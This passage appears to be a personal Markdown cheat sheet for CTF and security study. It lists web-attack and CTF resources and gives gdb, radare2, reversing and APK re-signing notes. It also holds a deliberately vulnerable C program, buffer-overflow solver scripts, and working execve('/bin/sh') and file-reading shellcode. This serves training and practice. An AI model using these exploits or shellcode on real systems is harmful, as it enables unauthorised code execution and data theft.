- [ghauri](https://github.com/r0oth3x49/ghauri) - An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws

### SSTI

- [us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
- [Server Side Template Injection - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/)
- [payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)
- [Jinja2 template injection filter bypasses \| Sebastian Neef - 0day.work](https://0day.work/jinja2-template-injection-filter-bypasses/)
- [websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

### CSRF

- check CSRF token
- check CORS header `Access-Control-Allow-Origin: *` in response headers
- check Set-Cookie header in response headers
  What's SameSite value?

### 401/403 Bypass

- [Ultimate 401 and 403 bypass methods](https://www.vidocsecurity.com/blog/401-and-403-bypass-how-to-do-it-right/)
- [byp4xx](https://github.com/lobuhi/byp4xx)
- [bypass-403](https://github.com/iamj0ker/bypass-403)

### Path Taversal / Directory Traversal

- [Directory Traversal - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/)
- [File Inclusion - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)
- [CTFのWebセキュリティにおけるPath Traversal, LFI/RFI (File Upload, ZipSlip)](https://blog.hamayanhamayan.com/entry/2021/12/08/220449)
- [File Inclusion and Path Traversal - Web Applications Pentesting](https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/)
- [LFI to RCE via PHP PEARCMD](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/#lfi-to-rce-via-php-pearcmd)
- [evilarc](https://github.com/ptoomey3/evilarc) - Create tar/zip archives that can exploit directory traversal vulnerabilities

### Command Injection

- [payloadbox/command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)

### DNS Rebind Attack

- [CWE - CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action (4.13)](https://cwe.mitre.org/data/definitions/350.html)
- [1u.ms](http://1u.ms/)
- [mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSer)

### SSRF

- [Gopherus](https://github.com/tarunkant/Gopherus) - This tool generates gopher link for exploiting SSRF and gaining RCE in various servers

### RCE

- [CVE-2023-43177](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43177) - CrushFTP prior to 10.5.1 is vulnerable to Improperly Controlled Modification of Dynamically-Determined Object Attributes
- [CVE-2023-49297](https://www.cve.org/CVERecord?id=CVE-2023-49297) - Unsafe YAML deserialization in PyDrive2, CLoader

### Information Disclosure

- [Sybil-Scan/imagemagick-lfi-poc: ImageMagick LFI PoC \[CVE-2022-44268\]](https://github.com/Sybil-Scan/imagemagick-lfi-poc) - CVE-2022-44268 ImageMagick 7.1.0-49 Arbitrary File Read
- [GitTools](https://github.com/internetwache/GitTools) - A repository with 3 tools for pwn'ing websites with .git repositories available

### Apache Tomcat

- [ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner) - A python script to scan for Apache Tomcat server vulnerabilities

### Curated

- [HackTricks](https://book.hacktricks.xyz/)
- [Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/)

## CTF

### Self-Hosted CTF Platform

- [ctf-platform · GitHub Topics](https://github.com/topics/ctf-platform)
- [CTFd](https://github.com/CTFd/CTFd)
- [rCTF](https://github.com/redpwn/rctf)
- [FBCTF](https://github.com/facebookarchive/fbctf)
- [RootTheBox](https://github.com/moloch--/RootTheBox)
- [kCTF](https://google.github.io/kctf/)
- [How do I host a CTF - CTF Handbook](https://ctf101.org/intro/how-to-run-a-ctf/)

### CTF Design

- [CTF Design Guidelines - Google Docs](https://docs.google.com/document/d/1QBhColOjT8vVeyQxM1qNE-pczqeNSJiWOEiZQF2SSh8/preview)
- [How to run a CTF that survives the first 5 minutes \| by Sam Calamos \| Medium](https://medium.com/@sam.calamos/how-to-run-a-ctf-that-survives-the-first-5-minutes-fded87d26d53)
- [Self-hosting a CTF Platform (CTFd)](https://medium.com/csictf/self-hosting-a-ctf-platform-ctfd-90f3f1611587)
- [Top 6 Platforms to Run your CTF On - CyberTalents](https://cybertalents.com/blog/top-platforms-to-run-your-ctf)

### Event

- [CTFtime.org](https://ctftime.org/)

### Always online CTFs

- [Hacker101 CTF](https://ctf.hacker101.com/)
- [picoCTF](https://play.picoctf.org/practice)
- [CpawCTF2](https://ctf2.cpaw.site/#!/)
- [Game Detectives](https://gamedetectives.net/)
- [ksnctf](https://ksnctf.sweetduet.info/)
- [CTFlearn](https://ctflearn.com/dashboard)
- [247CTF](https://247ctf.com/)
- [setodaNote CTF Exhibition](https://ctfexh.setodanote.net/)
- [OOO archive \| DEF CON CTF](https://archive.ooo)
- [Best CTF Platforms](https://infosecwriteups.com/best-ctf-platforms-876cc0870f3b)
- [W3Challs](https://w3challs.com/)
- [WeChall](https://www.wechall.net/)
- [Webhacking.kr](https://webhacking.kr/)
- [AlpacaHack](https://alpacahack.com/)
- [Dreamhack](https://dreamhack.io/)

### Getting Started / Tutorials

- [CTF 101](https://ctf101.org/)
- [The CTF Primer](https://primer.picoctf.com/)
- [Introduction | CTF Resources](http://ctfs.github.io/resources/)
- [Introduction · CTF Field Guide](https://trailofbits.github.io/ctf/index.html)
- [Introduction - CTF Wiki](https://ctf-wiki.org/en/)
- [ctf-tools](https://github.com/zardus/ctf-tools)
- [CTF-Heaven/Cheatsheets](https://github.com/thezakman/CTF-Heaven/tree/master/Cheatsheets)

### Other

- [apsdehal/awesome-ctf](https://github.com/apsdehal/awesome-ctf) - A curated list of CTF frameworks, libraries, resources and softwares
- CTF vs Real World: [CTFs vs Real life scenarios : cybersecurity](https://www.reddit.com/r/cybersecurity/comments/zj590l/ctfs_vs_real_life_scenarios/)
- CTF vs Bug Bounty: [Bug Bounty vs. CTF \[Understanding Differences & Benefits\] \| HackerOne](https://www.hackerone.com/bug-bounty-vs-ctf-understanding-differences-benefits)

## Pwn

### Notes

- [Binary Exploitation Notes](https://ir0nstone.gitbook.io/notes/)
- [MinGW-w64](https://www.mingw-w64.org/)
- [CS6265: Information Security Lab](https://tc.gts3.org/cs6265/tut/)
- [CTF Pwn - A painter and a black cat](https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn)
- [Pwn 入門編 - HackMD](https://hackmd.io/@xk4KNXQvTxu07bQ0WJ7FUQ/rJTiw9Ww4)
- ["Reverse Engineering for Beginners" free book](https://beginners.re/)
- [RE for Beginners | Reverse Engineering](https://web.archive.org/web/20240323192201/https://www.begin.re/)

### Challenges / Wargames

- [ROP Emporium](https://ropemporium.com/index.html)
- [pwnable.tw](https://pwnable.tw/challenge/)
- [Reversing.Kr](http://reversing.kr/)
- [pwn.college](https://pwn.college/)
- [Microcorruption](https://microcorruption.com/)
- [shellphish/how2heap](https://github.com/shellphish/how2heap)
- [OverTheWire: Wargames](https://overthewire.org/wargames/)
- [SmashTheStack Wargaming Network](http://www.smashthestack.org/)
- [io.netgarage.org](https://io.netgarage.org/)
- [xelenonz/game](https://github.com/xelenonz/game)
- [Crackmes](https://crackmes.one/)
- [FuzzySecurity](https://fuzzysecurity.com/tutorials.html)
- [Reverse Engineering challenges](https://challenges.re/)

### Tools

#### socat: Launch server

```bash
socat tcp4-listen:5700,reuseaddr,fork EXEC:./start,pty,stderr
```

- [cheat.sh/socat](https://cheat.sh/socat)

#### gdb (peda-gdb)

basic commands

- `disassemble main`, `disas main`
- `set disassembly-flavor intel`
- `break main`, `b main`
- `run`, `r`

instruction level

- `stepi`, `si`
- `nexti`, `ni`

program level

- `step into`, `s`
- `next`, `n`

Examine `x`

- Examine memory: x/NFU address
  - N = number
  - F = format
  - U = unit
- Examples
  - x/10xb 0xdeadbeef, examine 10 bytes in hex
  - x/xw 0xdeadbeef, examine 1 word in hex
  - x/s 0xdeadbeef, examine null terminated string
- `help x` to show details.

telescope

- `telescope [address]`

gdb io

- `r $(your_command_here)`: Use command output as an argument
- `r < <(your_command_here)`: Use command as input
- `r > filename`: Write command output to file
- `r < filename`: Use file as input

disassemble oneliner

```bash
gdb -batch -ex 'file /bin/ls' -ex 'disassemble main'
```

show context

```gdb
context all
context reg
context stack
```

follow-fork-mode

```gdb
set follow-fork-mode parent
```

References

- [Forks (Debugging with GDB)](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Forks.html)
- [gdb-peda quits while debugging program, regular gdb works file · Issue #143 · longld/peda](https://github.com/longld/peda/issues/143)
- [linux - Managing inputs for payload injection? - Reverse Engineering Stack Exchange](https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection)

#### radare2

```bash
r2 ./binary
> aaa
> s main
> V
p
```

#### Generate payload command

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*27 + b"\xbd\x86\x04\x08")'
python2 -c 'print b"A"*27 + b"\xbd\x86\x04\x08"'

echo -n 'AAAAAAAAAAAAAAAAAAAAAAAAAAA\xbd\x86\x04\x08'
```

#### Pwntools

- [pwntools-cheatsheet.md](https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf#logging-and-output)

  > ```python
  > log.warn('a warning message')     # -> [!] a warning message
  > log.info('some information')      # -> [*] some information
  > log.debug('a debugging message')  # -> [DEBUG] a debugging message
  > ```

### Solver Script Template

<details><summary>C code</summary>

```c
/*
compiled with
gcc -m32 -fno-stack-protector -o start start.c
*/

#include <stdio.h>
#include <stdlib.h>

void shell() {
    printf("You did it.\n");
    system("/bin/sh");
}

void vuln() {
    char buf[10] = {0};
    scanf("%s", buf);
}

int main(int argc, char const *argv[])
{
    printf("shell address: %p\n", shell);
    vuln();
}
```

</details>

<details><summary>Python <code>socket</code> library only</summary>

```python
import socket
import struct

host = "localhost"
port = 5700

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

shell_address = 0x565561BD

payload = b""
payload += b"A" * 22
payload += struct.pack("I", shell_address)

s.recv(1024)

s.send(payload + b"\n")
s.recv(1024)

s.send(b"id" + b"\n")
s.recv(1024)
print(s.recv(1024))

s.close()
```

</details>

<details><summary>Python pwntools</summary>

```python
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "split-window", "-h"]

elf = ELF("./chal", checksec=False)


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("localhost", 1337)

    elif args.GDB:
        gdbscript = """
        c
        """
        pty = process.PTY
        io = gdb.debug([elf.path], gdbscript=gdbscript, stdin=pty, stdout=pty)
    else:
        pty = process.PTY
        io = elf.process(stdin=pty, stdout=pty)

    return io


def main():
    payload = b""

    io = conn()
    io.sendlineafter(b"", payload)

    io.interactive("")


if __name__ == "__main__":
    main()
```

</details>

### Assembly

#### Basic Concept

test.c --preprocess--> included header, macro code --compile--> test.s --assemble--> test.o --link--> test

- [GCC and Make - A Tutorial on how to compile, link and build C/C++ applications](https://www3.ntu.edu.sg/home/ehchua/programming/cpp/gcc_make.html)

#### x86 AT&T

shellcode.s

```asm
xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
mov    %eax,%ecx
mov    %eax,%edx
mov    $0xb,%al
int    $0x80
xor    %eax,%eax
inc    %eax
int    $0x80
```

```shell
gcc -m32 -c shellcode.s
ld -m elf_i386 -o shellcode shellcode.o
./shellcode
```

#### x86 intel

shellcode.s

```asm
xor    eax, eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
mov    ecx, eax
mov    eax, edx
mov    al, 0x0b
int    0x80
xor    eax, eax
inc    eax
int    0x80
```

```shell
nasm -f elf shellcode.s
ld -m elf_i386 -o shellcode shellcode.o
./shellcode
```

#### References

- [how to assemble assembly with NASM assembler to 32-bit or 64-bit ELF binary with or without libc](https://gist.github.com/yellowbyte/d91da3c3b0bc3ee6d1d1ac5327b1b4b2)
- [nasm-assembly-examples/gcc-cheat-sheet.md](https://github.com/funnydman/nasm-assembly-examples/blob/master/gcc-cheat-sheet.md)
- [nasm-assembly-examples/nasm-cheat-sheet.md](https://github.com/funnydman/nasm-assembly-examples/blob/master/nasm-cheat-sheet.md)
- [NASM-Assembly-Cheat-Sheet/Cheat-Sheet.md](https://github.com/Siedler/NASM-Assembly-Cheat-Sheet/blob/master/Cheat-Sheet.md)
- [x64 NASM Cheat Sheet](https://gist.github.com/justinian/385c70347db8aca7ba93e87db90fc9a6)
- [Art of Assembly Language Programming and HLA by Randall Hyde](https://www.plantation-productions.com/Webster/)

### Disassembly

- [Online x86 and x64 Intel Instruction Assembler](https://defuse.ca/online-x86-assembler.htm)

### Shellcode

#### Shellcode Example References

- [Linux/x86 - execve(/bin/sh) - 28 bytes](https://shell-storm.org/shellcode/files/shellcode-811.php)
- [Shellcodes database for study cases](https://shell-storm.org/shellcode/index.html)
- [Exploit Database Shellcodes](https://www.exploit-db.com/shellcodes)
  - [linux_x86](https://www.exploit-db.com/shellcodes?platform=linux_x86)

#### Shellcode as string (binary to bytes)

- [Linux Shellcode 101: From Hell to Shell - BreakInSecurity](https://axcheron.github.io/linux-shellcode-101-from-hell-to-shell/)

  > `objdump -d ./execve|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'`

#### Pwntools shellcraft

- [pwnlib.shellcraft — Shellcode generation — pwntools 4.11.0 documentation](https://docs.pwntools.com/en/stable/shellcraft.html)

<details><summary>Command Line</summary>

```console
$ shellcraft -f d i386.linux.sh
\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80

$ # -f format, --format format
$ #                       Output format (default: hex), choose from {e}lf, {r}aw, {s}tring, {c}-style array, {h}ex string, hex{i}i, {a}ssembly code, {p}reprocssed code, escape{d} hex string
$ shellcraft -f d i386.linux.exit 0
\x31\xdb\x6a\x01\x58\xcd\x80

$ shellcraft -f a i386.linux.exit 0
    /* exit(status=0) */
    xor ebx, ebx
    /* call exit() */
    push SYS_exit /* 1 */
    pop eax
    int 0x80


$ shellcraft -f h i386.linux.exit 0
31db6a0158cd80
```

</details>

<details><summary>Python</summary>

```python
from pwn import *

elf = ELF("bugspray")
context.binary = elf

sc += asm(shellcraft.amd64.linux.cat("flag.txt"))
sc += asm(shellcraft.amd64.linux.exit(0))

payload += asm(shellcraft.execve('/bin/sh'))
```

</details>

#### x86 Shellcode Example

<details><summary>exit(2)</summary>

Assembly test.s

```asm
global _start

section .text

_start
        mov     eax, 1
        mov     ebx, 0
        int     0x80
```

Assemble

```shell
nasm -f elf32 test.s
ld -m elf_i386 -o test test.o
./test
```

Get hex machine code

```console
$ objdump -d ./test |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\xb0\x01\xcd\x80"
```

shellcode

```c
int main(int argc, char *argv[])
{
  char shellcode[] = "\x31\xc0\x31\xdb\xb0\x01\xcd\x80";
  (*(void(*)()) shellcode)();
  return 1;
}
```

See also: `man exit.2`

- [assembly - How to get c code to execute hex machine code? - Stack Overflow](https://stackoverflow.com/questions/9960721/how-to-get-c-code-to-execute-hex-machine-code/55893781#55893781)

</details>

<details><summary>hello world: write(2)</summary>

```console
$ grep '__NR_write ' /usr/src/linux-headers-6.3.0-kali1-amd64/arch/x86/include/generated/uapi/asm/unistd_32.h
#define __NR_write 4
```

test.s

```asm
global          _start

section         .data
        msg     db "Hello World!", 0

section         .text

_start:
        ;; write(1, hello, 13)
        mov     eax, 4
        mov     ebx, 1
        mov     ecx, msg
        mov     edx, 13
        int     0x80

        ;; exit(0)
        mov     eax, 1
        mov     ebx, 0
        int     0x80
```

Assemble

```shell
nasm -f elf32 test.s
ld -m elf_i386 -o test test.o
./test
```

but it's not working as shellcode

<https://stackoverflow.com/questions/15593214/linux-shellcode-hello-world>

1

```c
/*
global          _start

section         .text

_start:
        jmp     message

main:
        ;; write(1, hello, 13)
        xor     eax, eax
        mov     al, 4
        xor     ebx, ebx
        mov     bl, 1
        pop     ecx
        xor     edx, edx
        mov     dl, 16
        int     0x80

        ;; exit(0)
        xor     eax, eax
        mov     al, 1
        xor     ebx, ebx
        mov     bl, 1
        int     0x80

message:
        call    main
        msg     db "Hello World!", 0dh, 0ah

section         .data

$ nasm -f elf32 test.s && ld -m elf_i386 -o test test.o
$ objdump -d ./test |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x19\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x10\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xb3\x01\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a"
*/

// gcc -m32 -fno-stack-protector -z execstack -o hello hello.c

int main(int argc, char *argv[])
{
  char shellcode[] = "\xeb\x19\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x10\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xb3\x01\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a";
  (*(void(*)()) shellcode)();
  return 1;
}
```

2

```c
/*
global          _start

section         .text

_start:
        ;; write(1, "Hello World!\n", 13)
        xor     eax, eax
        mov     al, 4
        xor     ebx, ebx
        mov     bl, 1

        ;; >>> msg = "Hello World!\n"
        ;; >>> [hex(u32(msg[i:i+4].ljust(4, '\x00'))) for i in range(0, len(msg), 4)][::-1]
        ;; ['0xa', '0x21646c72', '0x6f57206f', '0x6c6c6548']
        push    0xa
        push    0x21646c72
        push    0x6f57206f
        push    0x6c6c6548

        mov     ecx, esp
        xor     edx, edx
        mov     dl, 13
        int     0x80

        ;; exit(0)
        xor     eax, eax
        mov     al, 1
        xor     ebx, ebx
        int     0x80


$ nasm -f elf32 test.s && ld -m elf_i386 -o test test.o
$ objdump -d ./test |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x6a\x0a\x68\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80"
*/

// gcc -m32 -fno-stack-protector -z execstack -o hello hello.c

int main(int argc, char *argv[])
{
  char shellcode[] = "\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x6a\x0a\x68\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";
  (*(void(*)()) shellcode)();
  return 1;
}
```

</details>

<details><summary>open, read, write</summary>

preudo code: tmp.c

```c
#include <unistd.h>

int main()
{
    char buf[100] = {0};

    int fd1 = open("test.txt", 0);
    read(fd1, buf, 100);
    write(1, buf, 100);
}
```

```bash
echo hello > test.txt
gcc -o tmp tmp.c
./tmp  # output: hello
```

```asm
section .text

global _start

_start:
        jmp two

one:
        xor eax, eax

        ;; open
        pop ebx
        mov al, 0x5
        int 0x80

        ;; read
        xor edx, edx
        mov ebx, eax
        mov al, 0x3
        mov ecx, esp
        sub esp, 0x55
        mov dl, 0x55
        int 0x80

        ;; write
        xor eax, eax
        mov al, 0x4
        mov bl, 0x1
        int 0x80

        ;; exit
        xor eax, eax
        xor ebx, ebx
        mov al, 1
        mov bl, 99
        int 0x80

two:
        call one
        string: db "/home/orw/flag"
```

```python
shellcode = b"\xeb\x28\x31\xc0\x5b\xb0\x05\xcd\x80\x31\xd2\x89\xc3\xb0\x03\x89\xe1\x83\xec\x55\xb2\x55\xcd\x80\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x63\xcd\x80\xe8\xd3\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x6f\x72\x77\x2f\x66\x6c\x61\x67"
```

- [Linux/x86 - Read /etc/passwd Shellcode (62 bytes)](https://www.exploit-db.com/shellcodes/44609)

</details>

### x86

#### Calling Convention

aka: Call Convention

[x86 Assembly/Interfacing with Linux - Wikibooks, open books for an open world](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux#Via_interrupt)

register mapping for system call invocation using `int $0x80`

| syscall number | 1st | 2nd | 3rd | 4th | 5th | 6th | result |
|----------------|-----|-----|-----|-----|-----|-----|--------|
| eax            | ebx | ecx | edx | esi | edi | ebp | eax    |

#### `syscall` number

- [x86.syscall.sh](https://x86.syscall.sh/)
- `/usr/src/linux-headers-6.3.0-kali1-amd64/arch/x86/include/generated/uapi/asm/unistd_32.h`

#### References

Wiki

- Calling Convention: [x86 Assembly/Interfacing with Linux - Wikibooks, open books for an open world](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux)
- Architecture: [x86 Assembly/X86 Architecture - Wikibooks, open books for an open world](https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture)
- Instructions: [x86 Assembly/X86 Instructions - Wikibooks, open books for an open world](https://en.wikibooks.org/wiki/X86_Assembly/X86_Instructions)
- instruction listings: [x86 instruction listings - Wikipedia](https://en.wikipedia.org/wiki/X86_instruction_listings)

Other

- [TEST (x86 instruction) - Wikipedia](https://en.wikipedia.org/wiki/TEST_(x86_instruction))
- [x86アセンブリ言語での関数コール](https://vanya.jp.net/os/x86call/)
- [X86アセンブラ/データ転送命令 - Wikibooks](https://ja.wikibooks.org/wiki/X86%E3%82%A2%E3%82%BB%E3%83%B3%E3%83%96%E3%83%A9/%E3%83%87%E3%83%BC%E3%82%BF%E8%BB%A2%E9%80%81%E5%91%BD%E4%BB%A4)

### x86_64

#### Calling Convention

[x86 Assembly/Interfacing with Linux - Wikibooks, open books for an open world](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux#Via_dedicated_system_call_invocation_instruction)

register mapping for system call invocation using `syscall`

| syscall number | 1st | 2nd | 3rd | 4th | 5th | 6th | result |
|----------------|-----|-----|-----|-----|-----|-----|--------|
| rax            | rdi | rsi | rdx | r10 | r8  | r9  | rax    |

register mapping for library call

| 1st | 2nd | 3rd | 4th | 5th | 6th |
|-----|-----|-----|-----|-----|-----|
| rdi | rsi | rdx | rcx | r8  | r9  |

#### `syscall` number

- [x64.syscall.sh](https://x64.syscall.sh/)

### Format String Attack

- [Exploiting a GOT overwrite - Binary Exploitation](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite)
- [Tut05: Format String Vulnerability - CS6265: Information Security Lab](https://tc.gts3.org/cs6265/2019/tut/tut05-fmtstr.html)
- [fsbの資料](https://gist.github.com/hhc0null/08c43983b4551f506722)
- [Exploiting Format String Vulnerabilities scut / team teso September 1, 2001](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
- [Format String Exploitation-Tutorial](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)
  - [Same PDF](https://web.archive.org/web/20150319002427/http://packetstorm.igor.onlinedirect.bg/papers/attack/formatstring-tutorial.pdf)
- [pwnlib.fmtstr — Format string bug exploitation tools — pwntools 4.11.0 documentation](https://docs.pwntools.com/en/stable/fmtstr.html)
- [日記: CTF やってみた(３)｜zk_phi](https://note.com/zk_phi/n/nc77f077017d7)

### ELF

<https://refspecs.linuxfoundation.org/elf/elf.pdf>

### Heap

- [Preface - heap-exploitation](https://heap-exploitation.dhavalkapil.com/)
- [Heap - Binary Exploitation](https://ir0nstone.gitbook.io/notes/types/heap)
- [The 67th Yokohama kernel reading party - YouTube](https://www.youtube.com/watch?v=0-vWT-t0UHg)

#### Use After Free

- [CWE - CWE-416: Use After Free (4.13)](https://cwe.mitre.org/data/definitions/416.html)
- [Using freed memory \| OWASP Foundation](https://owasp.org/www-community/vulnerabilities/Using_freed_memory)

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    char *buf1;
    char *buf2;
    char *buf3;

    buf1 = (char *) malloc(10);
    free(buf1);
    // printf("buf1: %p\n", buf1);

    buf2 = (char *) malloc(10);
    free(buf2);
    // printf("buf2: %p\n", buf2);

    buf3 = (char *) malloc(10);

    printf("buf1: %p\nbuf2: %p\nbuf3: %p\n", buf1, buf2, buf3);
}
```

Result

```console
$ make malloc_test && ./malloc_test
make: 'malloc_test' is up to date.
buf1: 0x5593d3f5e2a0
buf2: 0x5593d3f5e2a0
buf3: 0x5593d3f5e2a0
```

## Reversing

- [Ghidra](https://ghidra-sre.org/)
  - [GhidRust](https://github.com/DMaroo/GhidRust)
- [Compiler Explorer](https://godbolt.org/)
- [Computer Organization and Design ARM edition.pdf](http://staff.ustc.edu.cn/~llxx/cod/reference_books/Computer%20Organization%20and%20Design%20ARM%20edition.pdf)
- [Online x86 and x64 Intel Instruction Assembler](https://defuse.ca/online-x86-assembler.htm)
- [ReversingHero](https://www.reversinghero.com/)
- [Debuggex: Online visual regex tester. JavaScript, Python, and PCRE.](https://www.debuggex.com/)

### Windows

- [うさみみハリケーン](https://digitaltravesia.jp/usamimihurricane/webhelp/index.html)
- [PEView](http://wjradburn.com/software/)

### Python

- [python-uncompyle6](https://github.com/rocky/python-uncompyle6/) - A cross-version Python bytecode decompile
- [python-decompile3](https://github.com/rocky/python-decompile3) - Python decompiler for 3.7-3.8 Stripped down from uncompyle6 so we can refactor and start to fix up some long-standing problems
- [pycdc](https://github.com/zrax/pycdc) - C++ python bytecode disassembler and decompiler
- [show_pyc.py](https://github.com/nedbat/coveragepy/blob/master/lab/show_pyc.py)
- [Pyarmor](https://github.com/dashingsoft/pyarmor) - A tool used to obfuscate python scripts, bind obfuscated scripts to fixed machine or expire obfuscated scripts.
- [pyinstaller](https://github.com/pyinstaller/pyinstaller) - Freeze (package) Python programs into stand-alone executables
- [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) - PyInstaller Extractor
- [python-exe-unpacker](https://github.com/WithSecureLabs/python-exe-unpacker) - A helper script for unpacking and decompiling EXEs compiled from python code

### Android

#### Decompile

APK -> java

```shell
/usr/share/jadx/bin/jadx -d out APKey.apk

jadx-gui APKey.apk
```

#### Recompile APK

[Decompile, Modify Smali, Recompile and Sign APK - Hebun ilhanlı](https://www.hebunilhanli.com/wonderland/mobile-security/decompile-modify-smali-recompile-and-sign-apk/)

```shell
# apktoolversion: 2.7.0-dirty

# Decompile
apktool decode -r APKey.apk

# Modify smali
vi APKey/smali/com/example/apkey/MainActivity\$a.smali

# Re-compile. Generated to APKey/dist/APKey.apk
apktool build -d -f APKey

# Sign
cd APKey/dist/
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore APKey.apk alias_name
```

```console
$ keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
Enter keystore password:
Re-enter new password:
What is your first and last name?
  [Unknown]:
What is the name of your organizational unit?
  [Unknown]:
What is the name of your organization?
  [Unknown]:
What is the name of your City or Locality?
  [Unknown]:
What is the name of your State or Province?
  [Unknown]:
What is the two-letter country code for this unit?
  [Unknown]:
Is CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct?
  [no]:  yes

Generating 2,048 bit RSA key pair and self-signed certificate (SHA256withRSA) with a validity of 10,000 days
        for: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown
[Storing my-release-key.keystore]

$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore APKey.apk alias_name
Enter Passphrase for keystore:
   adding: META-INF/MANIFEST.MF
(snip)
  signing: classes.dex

>>> Signer
    X.509, CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown
    Signature algorithm: SHA256withRSA, 2048-bit key
    [trusted certificate]

jar signed.

Warning:
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
```

### dotnet

[dnSpy](https://github.com/dnSpy/dnSpy) - .NET debugger and assembly editor

```shell
# In Kali
rm -fr ~/.wine
winetricks dotnet6
wine ~/tools/dnSpy/dnSpy.exe
```

[ILSpy](https://github.com/icsharpcode/ILSpy) - .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (&more) - cross-platform!

### ysoserial.net

- [ysoserial.net](https://github.com/pwntester/ysoserial.net) - Deserialization payload generator for a variety of .NET formatters

#### How to use in Kali Linux

